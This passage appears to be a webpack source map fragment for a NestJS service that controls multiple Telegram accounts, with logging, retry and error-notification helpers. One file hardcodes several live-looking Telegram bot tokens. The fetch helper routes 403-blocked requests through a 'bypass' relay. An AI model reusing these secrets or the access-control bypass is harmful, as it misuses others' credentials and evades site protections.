uniqueSenders: number;\r\n    messageTypes: {\r\n        text: number;\r\n        photo: number;\r\n        video: number;\r\n        voice: number;\r\n        other: number;\r\n    };\r\n    topSenders: Array<{\r\n        id: string;\r\n        count: number;\r\n    }>;\r\n    mostActiveHours: Array<{\r\n        hour: number;\r\n        count: number;\r\n    }>;\r\n}\r\n\r\nexport interface ContentFilter {\r\n    chatId: string;\r\n    keywords?: string[];\r\n    mediaTypes?: ('photo' | 'video' | 'document')[];\r\n    actions: ('delete' | 'warn' | 'mute')[];\r\n}\r\n\r\nexport interface MessageScheduleOptions {\r\n    chatId: string;\r\n    message: string;\r\n    scheduledTime: Date;\r\n    replyTo?: number;\r\n    silent?: boolean;\r\n}\r\n\r\nexport interface GroupOptions {\r\n    title: string;\r\n    members?: string[];\r\n    photo?: string;\r\n    description?: string;\r\n    address?: string;\r\n    slowMode?: number;\r\n    megagroup?: boolean;\r\n    forImport?: boolean;\r\n    memberRestrictions?: {\r\n        sendMessages?: boolean;\r\n        sendMedia?: boolean;\r\n        sendStickers?: boolean;\r\n        sendGifs?: boolean;\r\n        sendGames?: boolean;\r\n        sendInline?: boolean;\r\n        embedLinks?: boolean;\r\n    };\r\n}\r\n\r\nexport interface ChannelInfo {\r\n    chatsArrayLength: number;\r\n    canSendTrueCount: number;\r\n    canSendFalseCount: number;\r\n    ids: string[];\r\n    canSendFalseChats: string[];\r\n}\r\n\r\nexport interface ChatFolderOptions {\r\n    name: string;\r\n    includedChats: string[];\r\n    excludedChats?: string[];\r\n    includeContacts?: boolean;\r\n    includeNonContacts?: boolean;\r\n    includeGroups?: boolean;\r\n    includeBroadcasts?: boolean;\r\n    includeBots?: boolean;\r\n    excludeMuted?: boolean;\r\n    excludeRead?: boolean;\r\n    excludeArchived?: boolean;\r\n}","import { NestFactory } from '@nestjs/core';\nimport mongoose from 'mongoose'\nimport { AppModule } from './app.module';\nimport { DocumentBuilder, SwaggerModule } from '@nestjs/swagger';\nimport { ValidationPipe } from '@nestjs/common';\nimport { Request, Response, NextFunction } from 'express';\n\nasync function bootstrap() {\n  const app = await NestFactory.create(AppModule);\n  const config = new DocumentBuilder()\n    .setTitle('NestJS and Express API')\n    .setDescription('API documentation')\n    .setVersion('1.0')\n    .build();\n\n  interface CustomRequest extends Request {}\n  interface CustomResponse extends Response {}\n  interface CustomNextFunction extends NextFunction {}\n\n  app.use((req: CustomRequest, res: CustomResponse, next: CustomNextFunction) => {\n    res.header('Access-Control-Allow-Origin', '*');\n    res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');\n    res.header('Access-Control-Allow-Headers', 'Content-Type, Accept');\n    next();\n  });\n\n  app.enableCors({\n    allowedHeaders: \"*\",\n    origin: \"*\"\n  });\n  const document = SwaggerModule.createDocument(app, config);\n  // fs.writeFileSync('./swagger-spec.json', JSON.stringify(document, null, 2));\n  SwaggerModule.setup('api', app, document);\n  mongoose.set('debug', true)\n  app.useGlobalPipes(new ValidationPipe({\n    transform: true,\n    // whitelist: true,\n    // forbidNonWhitelisted: true,\n    transformOptions: {\n      enableImplicitConversion: true\n    },\n    // validationError: {\n    //   target: false,\n    //   value: undefined\n    // }\n  }));\n  process.on('unhandledRejection', (reason, promise) => {\n    console.error('Unhandled Rejection at:', promise, 'reason:', reason);\n  });\n\n  process.on('uncaughtException', (reason, promise) => {\n    console.error(promise, reason);\n  });\n\n  let isShuttingDown = false;\n  const shutdown = async (signal: string) => {\n    if (isShuttingDown) return;\n    isShuttingDown = true;\n    console.log(`${signal} received`);\n    await app.close();\n    process.exit(0);\n  };\n\n  process.on('exit', async () => {\n    console.log('Application closed');\n  });\n\n  process.on('SIGINT', async () => {\n    await shutdown('SIGINT');\n  });\n\n  process.on('SIGTERM', async () => {\n    await shutdown('SIGTERM');\n  });\n\n  process.on('SIGQUIT', async () => {\n    await shutdown('SIGQUIT');\n  });\n\n  await app.init();\n  await app.listen(process.env.PORT || 9000);\n  console.log(`Application is running on: ${await app.getUrl()}`);\n}\nbootstrap();\n","import { Injectable, NestMiddleware, Logger } from '@nestjs/common';\nimport { Request, Response, NextFunction } from 'express';\nimport { fetchWithTimeout } from '../utils/fetchWithTimeout';\nimport { parseError } from '../utils/parseError';\nimport { notifbot } from '../utils/logbots';\n\n@Injectable()\nexport class LoggerMiddleware implements NestMiddleware {\n    private readonly logger = new Logger('HTTP');\n\n    use(req: Request, res: Response, next: NextFunction): void {\n        const { method, originalUrl, baseUrl } = req;\n        const userAgent = req.get('user-agent') || '';\n        const ip = req.ip;\n\n        const excludedEndpoints = ['/sendtochannel', '/favicon.', '/tgsignup'];\n        const isExcluded = (url: string) => excludedEndpoints.some(endpoint => url.startsWith(endpoint));\n        if (!isExcluded(originalUrl) && originalUrl !== '/') {\n            res.on('finish', () => {\n                const { statusCode } = res;\n                const contentLength = res.get('content-length');\n                if (statusCode >= 500) {\n                    fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${statusCode}`)}`);\n                    this.logger.error(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                } else if (statusCode >= 400) {\n                    fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${statusCode}`)}`);\n                    this.logger.warn(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                } else if (statusCode >= 300) {\n                    this.logger.verbose(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                } else {\n                    this.logger.log(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                }\n            });\n            res.on('error', (error) => {\n                const errorDetails = parseError(error, process.env.clientId);\n                fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${errorDetails.message}`)}`);\n            })\n        } else {\n            if (originalUrl.includes('Video')) {\n                this.logger.log(`Excluded endpoint hit: ${originalUrl} (length: ${originalUrl.length})`);\n            }\n        }\n\n        next();\n    }\n}\n","export function sleep(ms: number): Promise<void> {\n  return new Promise(resolve => setTimeout(resolve, ms));\n}\n\nexport function contains(str: string | null | undefined, arr: string[]): boolean {\n  if (!str || !Array.isArray(arr)) return false;\n  return arr.some(element => element && str.includes(element));\n}\n\nexport function toBoolean(value: string | number | boolean | null | undefined): boolean {\n  if (value === null || value === undefined) return false;\n  if (typeof value === 'string') {\n    const normalizedValue = value.toLowerCase().trim();\n    return normalizedValue === 'true' || normalizedValue === '1' || normalizedValue === 'yes';\n  }\n  if (typeof value === 'number') {\n    return value !== 0;\n  }\n  return value;\n}\n\nexport function fetchNumbersFromString(inputString: string | null | undefined): string {\n  if (!inputString) return '';\n  const regex = /\\d+/g;\n  const matches = inputString.match(regex);\n  return matches ? matches.join('') : '';\n}\n\nexport const defaultReactions = Object.freeze([\n  '❤', '🔥', '👏', '🥰', '😁', '🤔',\n  '🤯', '😱', '🤬', '😢', '🎉', '🤩',\n  '🤮', '💩', '🙏', '👌', '🕊', '🤡',\n  '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',\n  '🤣', '💔', '🏆', '😭', '😴', '👍',\n  '🌚', '⚡', '🍌', '😐', '💋', '👻',\n  '👀', '🙈', '🤝', '🤗', '🆒',\n  '🗿', '🙉', '🙊', '🤷', '👎'\n] as const);\n\nexport const defaultMessages = Object.freeze([\n  \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\",\n  \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\",\n  \"16\", \"17\", \"18\", \"19\", \"20\", \"21\"\n] as const);\n\nexport function areJsonsNotSame(json1: unknown, json2: unknown): boolean {\n  const keysToIgnore = ['id', '_id'];\n  console.log('[areJsonsNotSame] Starting comparison...');\n\n  function normalizeObject(obj: unknown): unknown {\n    if (obj === null || obj === undefined) return obj;\n    if (typeof obj !== 'object') return obj;\n    if (Array.isArray(obj)) return obj.map(normalizeObject);\n\n    const normalized: Record<string, unknown> = {};\n    const sortedKeys = Object.keys(obj as Record<string, unknown>)\n      .filter(key => !keysToIgnore.includes(key))\n      .sort();\n\n    for (const key of sortedKeys) {\n      normalized[key] = normalizeObject((obj as Record<string, unknown>)[key]);\n    }\n    return normalized;\n  }\n  const normalized1 = normalizeObject(json1);\n  const normalized2 = normalizeObject(json2);\n  const result = JSON.stringify(normalized1) !== JSON.stringify(normalized2);\n  console.log(`[areJsonsNotSame] Comparison result: ${result ? 'Objects are different' : 'Objects are same'}`);\n  \n  return result;\n}\n\nexport function mapToJson<K extends string | number | symbol, V>(map: Map<K, V>): Record<string, V> {\n  if (!(map instanceof Map)) {\n    throw new Error('Input must be a Map instance');\n  }\n  const obj: Record<string, V> = {};\n  for (const [key, value] of map.entries()) {\n    obj[String(key)] = value;\n  }\n  return obj;\n}\n","import axios, { AxiosRequestConfig, AxiosResponse } from \"axios\";\r\nimport { sleep } from \"telegram/Helpers\";\r\nimport { extractMessage, parseError } from \"./parseError\";\r\nimport { ppplbot } from \"./logbots\";\r\nimport http from 'http';\r\nimport https from 'https';\r\n\r\nexport async function fetchWithTimeout(\r\n    url: string,\r\n    options: AxiosRequestConfig & { bypassUrl?: string } = {},\r\n    maxRetries = 3\r\n): Promise<AxiosResponse | undefined> {\r\n    if (!url) {\r\n        console.error('URL is empty');\r\n        return undefined;\r\n    }\r\n\r\n    options.timeout = options.timeout || 30000; // Set default timeout to 30 seconds\r\n    options.method = options.method || \"GET\";\r\n    let lastError: Error | null = null;\r\n\r\n    console.log(`Trying: ${url}`);\r\n    const parsedUrl = new URL(url);\r\n    const host = parsedUrl.host;\r\n    const endpoint = parsedUrl.pathname + parsedUrl.search;\r\n\r\n    for (let attempt = 0; attempt <= maxRetries; attempt++) {\r\n        const controller = new AbortController();\r\n        const currentTimeout = options.timeout + (attempt * 5000); // Add 5 seconds per retry\r\n        const timeoutId = setTimeout(() => controller.abort(), currentTimeout);\r\n\r\n        try {\r\n            const response = await axios({\r\n                ...options,\r\n                url,\r\n                signal: controller.signal,\r\n                httpAgent: new http.Agent({ keepAlive: true, timeout: currentTimeout }),\r\n                httpsAgent: new https.Agent({ keepAlive: true, timeout: currentTimeout }),\r\n                maxRedirects: 5,\r\n            });\r\n            clearTimeout(timeoutId);\r\n            return response;\r\n        } catch (error) {\r\n            clearTimeout(timeoutId);\r\n            lastError = error;\r\n            const parsedError = parseError(error, `host: ${host}\\nendpoint:${endpoint}`, false);\r\n\r\n            const message = extractMessage(parsedError);\r\n            const isTimeout = axios.isAxiosError(error) &&\r\n                (error.code === \"ECONNABORTED\" ||\r\n                    error.message.includes(\"timeout\") ||\r\n                    parsedError.status === 408);\r\n\r\n            if (isTimeout) {\r\n                console.error(`Request timeout (${options.timeout}ms): ${url}`);\r\n                notify(`Timeout on attempt ${attempt}`, {\r\n                    message: `${process.env.clientId} host=${host}\\nendpoint=${endpoint}\\ntimeout=${options.timeout}ms`,\r\n                    status: 408\r\n                });\r\n            } else {\r\n                notify(`Attempt ${attempt} failed`, {\r\n                    message: `${process.env.clientId} host=${host}\\nendpoint=${endpoint}\\n${message.length < 250 ? `msg: ${message}` : \"msg: Message too long\"}`,\r\n                    status: parsedError.status\r\n                });\r\n            }\r\n\r\n            if (parsedError.status === 403) {\r\n                notify(`Attempting bypass for`, { message: `${process.env.clientId}  host=${host}\\nendpoint=${endpoint}` });\r\n                try {\r\n                    const bypassResponse = await makeBypassRequest(url, options);\r\n                    notify(`Successfully executed 403 request`, { message: `${process.env.clientId} host=${host}\\nendpoint=${endpoint}` });\r\n                    return bypassResponse;\r\n                } catch (bypassError) {\r\n                    const errorDetails = extractMessage(parseError(bypassError, `host: ${host}\\nendpoint:${endpoint}`, false));\r\n                    notify(`Bypass attempt failed`, `host=${host}\\nendpoint=${endpoint}\\n${errorDetails.length < 250 ? `msg: ${errorDetails}` : \"msg: Message too long\"}`);\r\n                    return undefined;\r\n                }\r\n            }\r\n\r\n            if (attempt < maxRetries && (shouldRetry(error, parsedError) || isRetryableStatus(parsedError.status))) {\r\n                const delay = calculateBackoff(attempt);\r\n                console.log(`Retrying request (${attempt + 1}/${maxRetries}) after ${delay}ms`);\r\n                await sleep(delay);\r\n                continue;\r\n            }\r\n            return undefined;\r\n        }\r\n    }\r\n    const errorData = extractMessage(parseError(lastError, `${process.env.clientId} host: ${host}\\nendpoint:${endpoint}`, false));\r\n    notify(`All ${maxRetries} retries exhausted`, `${errorData.length < 250 ? `msg: ${errorData}` : \"msg: Message too long\"}`);\r\n    return undefined;\r\n}\r\n\r\nasync function makeBypassRequest(url: string, options: AxiosRequestConfig & { bypassUrl?: string }): Promise<AxiosResponse | undefined> {\r\n    if (!options.bypassUrl && !process.env.bypassURL) {\r\n        console.error('Bypass URL is not provided');\r\n        throw new Error('Bypass URL is not provided');\r\n    }\r\n\r\n    options.bypassUrl = options.bypassUrl || `${process.env.bypassURL}/execute-request`;\r\n\r\n    const bypassAxios = axios.create({\r\n        responseType: options.responseType || 'json',\r\n        maxContentLength: Infinity,\r\n        maxBodyLength: Infinity,\r\n        timeout: options.timeout || 30000,\r\n        httpAgent: new http.Agent({ keepAlive: true }),\r\n        httpsAgent: new https.Agent({ keepAlive: true })\r\n    });\r\n\r\n    const response = await bypassAxios.post(options.bypassUrl, {\r\n        url,\r\n        method: options.method,\r\n        headers: options.headers,\r\n        data: options.data,\r\n        params: options.params,\r\n        responseType: options.responseType,\r\n        timeout: options.timeout,\r\n        followRedirects: options.maxRedirects !== 0,\r\n        maxRedirects: options.maxRedirects\r\n    }, {\r\n        headers: {\r\n            'Content-Type': 'application/json',\r\n            ...options.headers\r\n        }\r\n    });\r\n\r\n    if (options.responseType === 'arraybuffer' ||\r\n        response.headers['content-type']?.includes('application/octet-stream') ||\r\n        response.headers['content-type']?.includes('image/') ||\r\n        response.headers['content-type']?.includes('audio/') ||\r\n        response.headers['content-type']?.includes('video/') ||\r\n        response.headers['content-type']?.includes('application/pdf')) {\r\n\r\n        response.data = Buffer.from(response.data);\r\n    }\r\n\r\n    return response;\r\n}\r\n\r\nfunction shouldRetry(error: any, parsedError: any): boolean {\r\n    if (axios.isAxiosError(error)) {\r\n        const networkErrors = [\r\n            'ETIMEDOUT',\r\n            'ECONNABORTED',\r\n            'ECONNREFUSED',\r\n            'ECONNRESET',\r\n            'ERR_NETWORK',\r\n            'ERR_BAD_RESPONSE',\r\n            'EHOSTUNREACH',\r\n            'ENETUNREACH'\r\n        ];\r\n\r\n        if (error.code && networkErrors.includes(error.code)) {\r\n            return true;\r\n        }\r\n\r\n        if (error.message?.toLowerCase().includes('timeout')) {\r\n            return true;\r\n        }\r\n    }\r\n\r\n    return isRetryableStatus(parsedError.status);\r\n}\r\n\r\nfunction notify(prefix: string, errorDetails: any) {\r\n    const errorMessage = typeof errorDetails.message === 'string'\r\n        ? errorDetails.message\r\n        : JSON.stringify(errorDetails.message);\r\n\r\n    console.error(`${prefix}\\n${errorMessage.includes('ETIMEDOUT') ? 'Connection timed out' :\r\n        errorMessage.includes('ECONNREFUSED') ? 'Connection refused' :\r\n            extractMessage(errorDetails?.message)\r\n        }`);\r\n\r\n    if (errorDetails.status === 429) return;\r\n\r\n    const notificationText = `${prefix}\\n\\n${errorMessage.includes('ETIMEDOUT') ? 'Connection timed out' :\r\n        errorMessage.includes('ECONNREFUSED') ? 'Connection refused' :\r\n            extractMessage(errorDetails?.message)\r\n        }`;\r\n\r\n    try {\r\n        axios.get(`${ppplbot(process.env.httpFailuresChannel)}&text=${encodeURIComponent(notificationText)}`);\r\n    } catch (error) {\r\n        console.error(\"Failed to notify failure:\", error);\r\n    }\r\n}\r\n\r\nfunction isRetryableStatus(status: number): boolean {\r\n    return [408, 500, 502, 503, 504, 429].includes(status);\r\n}\r\n\r\nfunction calculateBackoff(attempt: number): number {\r\n    const minDelay = 500; // Start with 500ms\r\n    const maxDelay = 30000; // Cap at 30 seconds\r\n    const base = Math.min(minDelay * Math.pow(2, attempt), maxDelay);\r\n    const jitter = Math.random() * (base * 0.2); // Add up to 20% jitter\r\n    return Math.floor(base + jitter);\r\n}","const notifbottokens: string[] = [\r\n    '5856546982:AAEW5QCbfb7nFAcmsTyVjHXyV86TVVLcL_g',\r\n    '7628485611:AAECLtviheixcYoEBL_EhfsCegct7lgV-Zk',\r\n    '7940072383:AAHwRu4_4QWqeuC4ZClS9OiSfBOVQ7TvGHw'\r\n];\r\nlet currentNotifTokenIndex = 0;\r\n\r\nexport function notifbot(chatId: string = process.env.accountsChannel || \"-1001801844217\", botToken?: string): string {\r\n    const token = botToken || notifbottokens[currentNotifTokenIndex];\r\n    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}`;\r\n\r\n    if (!botToken) {\r\n        currentNotifTokenIndex = (currentNotifTokenIndex + 1) % notifbottokens.length;\r\n    }\r\n\r\n    return apiUrl;\r\n}\r\n\r\nconst ppplbottokens: string[] = [\r\n    '7281017483:AAGoeVPH98k8rXUpoR22XomfAL7PzMtJVVk',\r\n    '7499764732:AAH3flZUF7J1zwK1xac8fI50lR24WeQAbNo',\r\n    '6735591051:AAELwIkSHegcBIVv5pf484Pn09WNQj1Nl54',\r\n    '6624618034:AAHoM3GYaw3_uRadOWYzT7c2OEp6a7A61mY',\r\n    '6607225097:AAG6DJg9Ll5XVxy24Nr449LTZgRb5bgshUA'\r\n];\r\nlet currentPpplTokenIndex = 0;\r\n\r\nexport function ppplbot(chatId: string = process.env.updatesChannel || '-1001972065816', botToken?: string): string {\r\n    const token = botToken || ppplbottokens[currentPpplTokenIndex];\r\n    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}`;\r\n\r\n    if (!botToken) {\r\n        currentPpplTokenIndex = (currentPpplTokenIndex + 1) % ppplbottokens.length;\r\n    }\r\n\r\n    return apiUrl;\r\n}\r\n","import { fetchWithTimeout } from \"./fetchWithTimeout\";\r\nimport { notifbot } from \"./logbots\";\r\n\r\nexport const extractMessage = (data: any): string => {\r\n  if (Array.isArray(data)) {\r\n    return `${data.map((item) => extractMessage(item)).join('\\n')}`;\r\n  }\r\n\r\n  if (\r\n    typeof data === 'string' ||\r\n    typeof data === 'number' ||\r\n    typeof data === 'boolean'\r\n  ) {\r\n    return String(data);\r\n  }\r\n\r\n  if (typeof data === 'object' && data !== null) {\r\n    const messages: string[] = [];\r\n\r\n    for (const key in data) {\r\n      const value = data[key];\r\n      const newPrefix = key;\r\n\r\n      if (Array.isArray(value)) {\r\n        messages.push(\r\n          `${newPrefix}=${value.map((item) => extractMessage(item)).join('\\n')}`,\r\n        );\r\n      } else if (\r\n        typeof value === 'string' ||\r\n        typeof value === 'number' ||\r\n        typeof value === 'boolean'\r\n      ) {\r\n        messages.push(`${newPrefix}=${value}`);\r\n      } else if (typeof value === 'object' && value !== null) {\r\n        messages.push(String(extractMessage(value)));\r\n      }\r\n    }\r\n\r\n    return messages.length > 0 ? messages.join('\\n') : '';\r\n  }\r\n\r\n  return ''; // Return empty string for null, undefined, and unhandled types\r\n};\r\n\r\nexport function parseError(\r\n  err: any,\r\n  prefix?: string,\r\n  sendErr: boolean = true\r\n): {\r\n  status: number;\r\n  message: string;\r\n  error: any;\r\n} {\r\n  const clientId = process.env.clientId || 'UnknownClient';\r\n  const notifChannel = process.env.notifChannel || 'UnknownChannel';\r\n  const prefixStr = `${clientId} - ${prefix || ''}`;\r\n  let status: number = 500;\r\n  let message = 'An unknown error occurred';\r\n  let error: any = 'UnknownError';\r\n\r\n  // Handle the case where `err` is undefined\r\n  if (!err) {\r\n    message = 'No error object provided';\r\n    error = 'NoErrorObject';\r\n  } else if (err.response) {\r\n    const response = err.response;\r\n    status =\r\n      response.data?.statusCode ||\r\n      response.data?.status ||\r\n      response.data?.ResponseCode ||\r\n      response.status ||\r\n      err.status ||\r\n      500;\r\n    message =\r\n      response.data?.message ||\r\n      response.data?.errors ||\r\n      response.data?.ErrorMessage ||\r\n      response.data?.errorMessage ||\r\n      response.data?.UserMessage ||\r\n      response.data ||\r\n      response.message ||\r\n      response.statusText ||\r\n      err.message ||\r\n      'An error occurred';\r\n    error =\r\n      response.data?.error || response.error || err.name || err.code || 'Error';\r\n  } else if (err.request) {\r\n    status = err.status || 408;\r\n    message =\r\n      err.data?.message ||\r\n      err.data?.errors ||\r\n      err.data?.ErrorMessage ||\r\n      err.data?.errorMessage ||\r\n      err.data?.UserMessage ||\r\n      err.data ||\r\n      err.message ||\r\n      err.statusText ||\r\n      'The request was triggered but no response was received';\r\n    error = err.name || err.code || 'NoResponseError';\r\n  } else if (err.message) {\r\n    status = err.status || 500;\r\n    message = err.message;\r\n    error = err.name || err.code || 'Error';\r\n  }\r\n\r\n  const fullMessage = `${prefixStr} :: ${extractMessage(message)}`;\r\n  const response = { status, message: err.errorMessage ? err.errorMessage : String(fullMessage), error };\r\n  console.log(\"ParsedErr: \", {\r\n    fullMessage,\r\n    ...response\r\n  });\r\n  if (sendErr) {\r\n    try {\r\n      const shouldSend = !fullMessage.includes(\"INPUT_USER_DEACTIVATED\") &&\r\n        status.toString() !== \"429\" &&\r\n        !fullMessage.toLowerCase().includes(\"too many req\") &&\r\n        !fullMessage.toLowerCase().includes('could not find') &&\r\n        !fullMessage.includes('ECONNREFUSED');\r\n\r\n      if (shouldSend) {\r\n        const notifUrl = `${notifbot()}&text=${prefixStr} :: ${err.errorMessage ? err.errorMessage : extractMessage(message)}`;\r\n        fetchWithTimeout(notifUrl);\r\n      }\r\n    } catch (fetchError) {\r\n      console.error('Failed to send error notification:', fetchError);\r\n    }\r\n  }\r\n  return response;\r\n}","module.exports = require(\"@nestjs/common\");","module.exports = require(\"@nestjs/config\");","module.exports = require(\"@nestjs/core\");","module.exports = require(\"@nestjs/mapped-types\");","module.exports = require(\"@nestjs/mongoose\");","module.exports = require(\"@nestjs/swagger\");","module.exports = require(\"adm-zip\");","module.exports = require(\"axios\");","module.exports = require(\"big-integer\");","module.exports = require(\"class-transformer\");","module.exports = require(\"class-validator\");","module.exports = require(\"cloudinary\");","module.exports = require(\"https\");","module.exports = require(\"imap\");","module.exports = require(\"mongoose\");","module.exports = require(\"telegram\");","module.exports = require(\"telegram/Helpers\");","module.exports = require(\"telegram/Password\");","module.exports = require(\"telegram/client/uploads\");","module.exports = require(\"telegram/events\");","module.exports = require(\"telegram/extensions/Logger\");","module.exports = require(\"telegram/sessions\");","module.exports = require(\"telegram/tl\");","module.exports = require(\"crypto\");","module.exports = require(\"fs\");","module.exports = require(\"http\");","module.exports = require(\"path\");","// The module cache\nvar __webpack_module_cache__ = {};\n\n// The require function\nfunction __webpack_require__(moduleId) {\n\t// Check if module is in cache\n\tvar cachedModule = __webpack_module_cache__[moduleId];\n\tif (cachedModule !== undefined) {\n\t\treturn cachedModule.exports;\n\t}\n\t// Create a new module (and put it into the cache)\n\tvar module = __webpack_module_cache__[moduleId] = {\n\t\t// no module.id needed\n\t\t// no module.loaded needed\n\t\texports: {}\n\t};\n\n\t// Execute the module function\n\t__webpack_modules__[moduleId].call(module.exports, module, module.exports, __webpack_require__);\n\n\t// Return the exports of the module\n\treturn module.exports;\n}\n\n","// startup\n// Load entry module and return exports\n// This entry module is referenced by other modules so it can't be inlined\nvar __webpack_exports__ = __webpack_require__(7927);\n"],"names":["MailReader","isReady","result","this","imap","user","process","env","GMAIL_ADD","password","GMAIL_PASS","host","port","tls","tlsOptions","rejectUnauthorized","on","console","log","err","error","getInstance","instance","connectToMail","connect","parseError","disconnectFromMail","end","isMailReady","getCode","sleep","openInbox","searchCriteria","fetchOptions","bodies","markSeen","results","Promise","resolve","reject","search","length","fetch","msg","seqno","emailData","stream","info","buffer","chunk","toString","which","push","seq","addFlags","expunge","once","split","fetchNumbersFromString","openBox","AppController","constructor","appService","logger","Logger","getHello","executeRequest","requestDetails","res","requestId","randomUUID","startTime","Date","now","url","method","headers","data","params","responseType","timeout","followRedirects","maxRedirects","message","details","sanitizeHeaders","dataSize","JSON","stringify","response","maxContentLength","Infinity","maxBodyLength","validateStatus","decompress","status","Object","entries","forEach","key","value","toLowerCase","Array","isArray","setHeader","metrics","executionTime","contentType","includes","getHeader","send","Buffer","from","code","stack","json","sensitiveHeaders","reduce","acc","Get","Post","ApiOperation","summary","Body","ValidationPipe","transform","Res","ExecuteRequestDto","Controller","AppService","AppModule","configure","consumer","apply","LoggerMiddleware","forRoutes","Module","imports","initModule","TelegramModule","ActiveChannelsModule","ClientModule","UserDataModule","UsersModule","BufferClientModule","ArchivedClientModule","ChannelsModule","PromoteClientModule","BuildModule","UpiIdModule","PromoteMsgModule","PromoteStatModule","StatModule","Stat2Module","TgSignupModule","TransactionModule","NpointModule","controllers","providers","exports","Injectable","CloudinaryService","resources","Map","cloudinary","v2","config","cloud_name","CL_NAME","api_key","CL_APIKEY","api_secret","CL_APISECRET","name","getResourcesFromFolder","downloadAndExtractZip","rootPath","cwd","zipPath","path","extractPath","fetchWithTimeout","errorMessage","Error","fs","writeFileSync","zip","extractAllTo","unlinkSync","folderName","createNewFolder","createFolder","uploadFilesToFolder","overwriteFile","uploader","upload","resource_type","overwrite","invalidate","public_id","findAndSaveResources","type","api","prefix","max_results","all","map","async","resource","set","extension","substring","lastIndexOf","mypath","join","statusText","existsSync","saveFile","create_folder","uploadPromises","upload_large","folder","printResources","val","get","publicId","getBuffer","Configuration","Schema","versionKey","autoIndex","strict","timestamps","toJSON","virtuals","doc","ret","_id","ConfigurationSchema","SchemaFactory","createForClass","add","Types","Mixed","ConfigurationController","configurationService","findOne","update","updateClientDto","Patch","ApiBody","ApiTags","ConfigurationService","connection","onModuleInit","clientId","notifbot","encodeURIComponent","onModuleDestroy","closeConnection","close","Global","ConfigModule","forRoot","MongooseModule","forRootAsync","useFactory","uri","mongouri","forFeature","collection","schema","Inject","getConnectionToken","Connection","configurationModel","setEnv","OnModuleInit","exec","NotFoundException","updatedUser","findOneAndUpdate","$set","new","upsert","InjectModel","Model","TelegramController","telegramService","handleTelegramOperation","operation","BadRequestException","mobile","createClient","disconnect","deleteClient","disconnectAllClients","disconnectAll","getMe","getEntity","entity","updateProfile","updateProfileDto","updateNameandBio","firstName","about","setProfilePhoto","photoDto","setProfilePic","deleteProfilePhotos","getMessages","chatId","limit","forwardMessage","forwardDto","forwardBulkMessages","fromChatId","toChatId","messageIds","processBatchMessages","batchOp","processBatch","items","batchSize","batch","BatchOperationType","FORWARD","item","messageId","DELETE","deleteChat","delayMs","bulkOp","searchMessages","query","types","offset","getChannelInfo","includeIds","joinChannel","channel","forward","joinChannelAndForward","leaveChannel","setup2FA","set2Fa","updatePrivacy","updatePrivacyBatch","settings","getActiveSessions","getAuths","terminateOtherSessions","removeOtherAuths","createNewSession","getSessionInfo","terminateSession","getConnectionStatus","getClientMetadata","getClientStatistics","getHealthStatus","connections","statistics","getCallLogStats","getCallLog","addContactsBulk","contactsDto","addContacts","phoneNumbers","getContacts","getMediaInfo","getMediaMetadata","sendMedia","sendMediaDto","client","MediaType","PHOTO","sendPhotoChat","caption","filename","sendFileChat","downloadMedia","downloadMediaFile","sendMediaAlbum","albumDto","searchDto","getFilteredMedia","startDate","endDate","minId","maxId","undefined","getGroupMembers","groupId","getGrpMembers","blockChat","blockUser","deleteChatHistory","sendMessageWithInlineButton","sendInlineMessage","getAllDialogs","offsetId","archived","getDialogs","getLastActiveTime","createGroupWithOptions","options","updateGroupSettings","addGroupMembers","memberOp","members","removeGroupMembers","handleAdminOperation","adminOp","isPromote","promoteToAdmin","userId","permissions","rank","demoteAdmin","cleanupChat","cleanup","beforeDate","onlyMedia","excludePinned","getChatStatistics","period","scheduleMessage","schedule","scheduledTime","replyTo","silent","getScheduledMessages","sendVoiceMessage","voice","getChatHistory","getMessagesNew","validateSession","isConnected","connected","isValid","phoneNumber","unblockGroupUser","getGroupAdmins","getGroupBannedUsers","exportContacts","exportDto","format","includeBlocked","toISOString","importContacts","contacts","manageBlockList","blockList","userIds","block","getContactStatistics","createChatFolder","getChatFolders","editMessage","updateChatSettings","sendMediaBatch","hasPassword","getChats","offsetDate","offsetPeer","folderId","getFileUrl","getMessageStats","getTopPrivateChats","ApiParam","description","required","ApiResponse","Param","UpdateProfileDto","ProfilePhotoDto","Delete","ApiQuery","Number","Query","ForwardBatchDto","BatchProcessDto","enum","MessageType","Boolean","PrivacySettingsDto","ConnectionStatusDto","AddContactsDto","SendMediaDto","SendMediaAlbumDto","MediaSearchDto","MediaMetadataDto","createGroupDto","GroupSettingsDto","GroupMemberOperationDto","AdminOperationDto","ChatCleanupDto","ScheduleMessageDto","ContactExportImportDto","ContactBlockListDto","CreateChatFolderDto","Put","UsePipes","whitelist","forbidNonWhitelisted","TelegramService","forwardRef","TelegramValidationConfig","provide","useValue","ConnectionManager","TelegramLogger","usersService","bufferClientService","activeChannelsService","channelsService","connectionManager","metadataTracker","ClientMetadataTracker","cleanupInterval","startCleanupInterval","logOperation","clearInterval","getActiveClientSetup","setActiveClientSetup","executeWithConnection","handler","getClientOrThrow","updateLastUsed","executeWithRateLimit","recordOperation","getClient","TelegramError","TelegramErrorCode","CLIENT_NOT_FOUND","clientsMap","hasClient","number","has","releaseConnection","delete","clients","keys","clear","clearJoinChannelInterval","autoDisconnect","telegramManager","session","acquireConnection","initializeClient","setTimeout","removeClient","setInterval","logError","errorDetails","contains","updateByFilter","$or","tgId","expired","username","getChatId","telegramClient","getchatId","tryJoiningChannel","chatEntity","canSendMsgs","remove","channelId","removeChannels","channelDetails","searchError","private","addContact","getSelfMsgsInfo","getSelfMSgsInfo","createGroup","forwardSecrets","createGroupAndForward","getmedia","getMediaMessages","sendIds","channelInfo","set2fa","HttpException","updatePrivacyforDeletedAccount","updateProfilePic","downloadProfilePic","index","updateUsername","leaveChannels","leaveChannelIds","canS